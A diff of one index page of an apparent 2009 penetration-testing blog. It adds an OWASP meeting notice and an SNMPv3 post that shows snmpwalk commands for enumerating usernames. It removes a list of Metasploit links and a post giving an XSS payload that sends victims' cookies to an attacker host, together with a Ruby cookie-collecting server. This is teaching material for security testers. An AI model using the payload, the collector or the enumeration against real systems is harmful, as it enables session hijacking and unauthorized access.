@@ -158,6 +158,77 @@
 
   <span class="post-date">
     
+    September
+    11th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="https://raesene.github.io/blog/2009/09/11/owasp_scotland/">OWASP Scotland - September Meeting</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>The OWASP Scotland september meeting is all set for Tuesday the 15th of September.<br />
+We've got three good speakers lined up so, it's shaping up to be a good meeting.<br />
+More details <a href="http://www.owasp.org/index.php/Scotland#September_Chapter_Meeting"> here </a> .  Meeting is open to all, but if you're planning to come along, please RSVP to me at <a href="mailto:rorym@nmrconsult.net">this address</a>, so we can get an idea of numbers.</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
+    August
+    26th,
+    
+    2009
+  </span>
+
+  <h2>
+    <a href="https://raesene.github.io/blog/2009/08/26/testing_snmpv3/">Testing SNMPv3</a>
+  </h2>
+
+  <div>
+    
+    
+    <p>After encountering some SNMPv3 servers recently and looking into the differences from a pen. test perspective, I thought it may be worth a quick write-up.<br />
+SNMPv1 and v2 do not respond when traffic is sent their way unless there is a valid community string in the message, a fact used by scanners like <a href="http://labs.portcullis.co.uk/application/onesixtyone/"> onesixtyone </a>.  So traditionally the theory is unless there's a known community string, the service running has a vulnerability or you can get in-line to sniff traffic, there's not a lot to get from SNMP services.<br />
+Turns out that SNMPv3 behaves differently from v1 and v2.  Firstly the notion of using community strings for authentication is gone, replaced by username/passwords.  Second the traffic can be encrypted to limit sniffing opportunites.<br />
+However it's not all bad from a testers perspective! unlike earlier versions SNMPv3 will respond to correctly formatted requests and provide some information about itself as part of the reply.  This allows confirmation of the servers existence.<br />
+To get these responses there's a couple of different tools we can use.  <a href="http://nmap.org/">Nmap</a> with version detection will confirm that a SNMPv3 service is running and looking at the traffic in wireshark <span class="mt-enclosure mt-enclosure-image" style="display:inline;"><img alt="wireshark-nmap-snmpv3.png" src="http://www.mccune.org.uk/blog/wireshark-nmap-snmpv3.png" width="866" height="802" class="mt-image-center" style="text-align:center;display:block;margin:0 auto 20px;" /></span><br />
+From this there's a couple of interesting pieces of information.  The Engine Enterprise ID field seems to identify the server type that's running, net-snmp in this case and the msgAuthoritativeEngineTime parameter shows the time in seconds since the service was started (according to <a href="http://www.cisco.com/web/about/ac123/ac147/archived_issues/ipj_1-3/snmpv3.html"> this page</a> ).<br />
+In addition to using nmap, it's possible to use the inbuilt snmp tools to get some information out of the service including possible username enumeration and brute-force password attacks.<br />
+Issuing the snmpwalk command with an invalid username like so:<br />
+<b>snmpwalk -v 3 -n '' -l noAuthNoPriv -u "invaliduser" 192.168.207.142 IF-MIB::ifName</b><br />
+provides the response <b><i>snmpwalk: Unknown user name</i></b><br />
+but if we use a valid username and no password like so:<br />
+<b>snmpwalk -v 3 -n '' -l noAuthNoPriv -u "snmpUser" 192.168.207.142 IF-MIB::ifName</b><br />
+we get <b><i>Error in packet. Reason: authorizationError (access denied to that object)</i></b><br />
+So it's possible by parsing responses to figure out valid usernames for the service.<br />
+<b>Update : </b>  Here's a ruby script (should work on linux with snmp tools and ruby installed) which iterates over a list of usernames and a list of IPs and attempts to guess whether the username is valid or not <a href="http://www.mccune.org.uk/code/snmpv3enum.rb">snmpv3enum.rb</a><br />
+A similar technique works with specification of passwords which would allow for brute-forcing those as well, (although that said the snmp tools try to stop people choosing passwords less than 8 characters, so unless a dictionary word is used it isn't too likely to be successful.<br />
+Additionally for people who're fond of metasploit, I've knocked up a very basic SNMPv3 scanner.  At the moment all it does it take a range of IP addresses and say whether a valid SNMPv3 packet provokes a response from the server, but could be handy.  it's <a href="http://www.mccune.org.uk/code/snmpv3.rb">here</a>.<br />
+There's some good references on setting up and using SNMPv3 <a href="http://www.sysadmin.md/snmpv3-users-cheatsheet.html">here</a>, <a href="http://tomclegg.net/snmpv3-cacti">here</a> and <a href="http://wmunguiam.blogspot.com/2009/07/howto-use-snmpv3-ubuntu.html">here</a>.</p>
+
+    
+    
+  </div>
+
+</article>
+
+
+<article class="home">
+
+  <span class="post-date">
+    
     August
     9th,
     
@@ -455,118 +526,6 @@ Once you've gathered URLs and fed them in to the database getting the scanner to
 
 </article>
 
-
-<article class="home">
-
-  <span class="post-date">
-    
-    May
-    4th,
-    
-    2009
-  </span>
-
-  <h2>
-    <a href="https://raesene.github.io/blog/2009/05/04/metasploit_reso/">Metasploit Resources</a>
-  </h2>
-
-  <div>
-    
-    
-    <p>So I've been playing a bit with Metasploit over the holiday weekend (hey what are days off for..), and as usual when researching stuff, I've come across a load of links I don't want to lose track of, so I'll put them up here, may be useful to someone else as well..<br />
-I'll refrain from the really obvious linking to the project homepage, as if you're looking for metasploit links, I'd guess you've found it already :)<br />
-<b>Pre-Exploitation Information</b></p>
-<ul>
-<li><a href="http://synjunkie.blogspot.com/2008/10/metasploit-payloads-msfpayload.html"> Good set of examples for using msfpayload to create executable payloads</a></li>
-<li><a href="http://sites.google.com/site/visitabhiluck/Home/technical-writing/creating-malicious-executables-using-metasploit">More msfpayload information</a></li>
-<li><a href="http://www.darkoperator.com/blog/2009/4/25/evil-packaging-on-osx-with-xcode-and-metasploit.html">Interesting worked example of msfpayload setup on osx</a></li>
-<li><a href="http://www.gamelinux.org/?cat=17">Interesting write-up on eval_php for for webserver compromise</a></li>
-</ul>
-<p><b>Post-Exploitation (meterpreter and the like) Information</b></p>
-<ul>
-<li><a href="http://carnal0wnage.blogspot.com/2009/04/more-on-working-with-incognito-and.html">Post on meterpreter usage</a>.  Has some interesting points on what can be done with Meterpreter.</li>
-<li><a href="http://www.kecoak-elektronik.net/log/2009/03/01/fun-and-profit-with-meterpreter/"> Interesting post on using meterpreter again</a> Some information on using meterpreter scripts like killav to stop exploits being detected, and timestomp to make discovery harder.</li>
-<li><a href="http://sites.google.com/site/visitabhiluck/Home/technical-writing/post-exploitation-activities"> Article from the Metasploit wikibook on post-exploitation activities</a></li>
-</ul>
-
-    
-    
-  </div>
-
-</article>
-
-
-<article class="home">
-
-  <span class="post-date">
-    
-    March
-    31st,
-    
-    2009
-  </span>
-
-  <h2>
-    <a href="https://raesene.github.io/blog/2009/03/31/rack_for_pen_te/">Rack for Pen Testing</a>
-  </h2>
-
-  <div>
-    
-    
-    <p>One of the many things I got introduced to at Scotland on Rails was the <a href="http://rack.rubyforge.org/">Rack project</a>.  Designed to help create flexible web application deployments, it creates an interface between webservers and ruby web app. frameworks (rails, sinatra etc).<br />
-Reading some of the examples, it occurred to me that Rack could be pretty handy for web application testing where sometimes it's useful to have a minimal web application to bounce things off.<br />
-One example of this is demo'ing XSS attacks.  A standard XSS attack is cookie stealing.  The way this works is the attacker inserts a script tag with a reference to a URL controlled by the attacker and inserts the cookie for the victim site into a parameter to the URL.<br />
-So for example if we've found an XSS vector we can put</p>
-<pre>
-&lt;script&gt;document.location=&quot;http://&lt;attacker_ip/cookiegrabber?cookie=&quot;+document.cookie&lt;/script&gt;
-</pre>
-<p>into the vulnerable box and if we have a server listening on that IP address we get the cookie..<br />
-Here's where rack comes in.  You can use rack to very quickly create some code to listen on a port and accept the incoming request (and indeed to anything else you can do with ruby, but hey lets start small).<br />
-A proof of concept script to do something like this might look like the one below...</p>
-<pre>
-#!/usr/bin/env ruby
-require 'rubygems'
-require 'rack'
-builder = Rack::Builder.new do
-use Rack::CommonLogger
-@@grabbed = Array.new
-map '/' do
-run Proc.new {|env| [200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;&lt;h1&gt; Rack Pen Test Helper&lt;/h1&gt;&quot;]}
-end
-map '/cookiegrabber' do
-app = proc do |env|
-req = Rack::Request.new(env)
-ip = req.ip.to_s
-cookie = req.params['cookie'] || &quot;No Cookie Parameter passed&quot;
-@@grabbed &lt;&lt; [ip,cookie]
-[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;grabbed &quot; + cookie + &quot; from &quot; + ip + &quot;&lt;br /&gt; Grabbed &quot; + @@grabbed.length.to_s + &quot; cookies so far&quot;]
-end
-run app
-end
-map '/cookiegrabbed' do
-app = proc do |env|
-out = &quot;&quot;
-if @@grabbed.length &gt; 0
-@@grabbed.each do |crumb|
-out &lt;&lt; &quot;Grabbed a cookie with value  &quot; + crumb[1] + &quot; from &quot; + crumb[0] + &quot;&lt;br /&gt;&quot;
-end
-else
-out = &quot;Nothing Grabbed so far&quot;
-end
-[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, out]
-end
-run app
-end
-end
-Rack::Handler::Mongrel.run builder, :Port =&gt; 9292
-</pre>
-
-    
-    
-  </div>
-
-</article>
-
 <hr/>
 
 <ul class="pager"> 
@@ -580,7 +539,7 @@ Rack::Handler::Mongrel.run builder, :Port =&gt; 9292
   
   
   <li>
-    <span class="page_number">Page: 14 of 54</span>
+    <span class="page_number">Page: 14 of 55</span>
   </li>
 
   
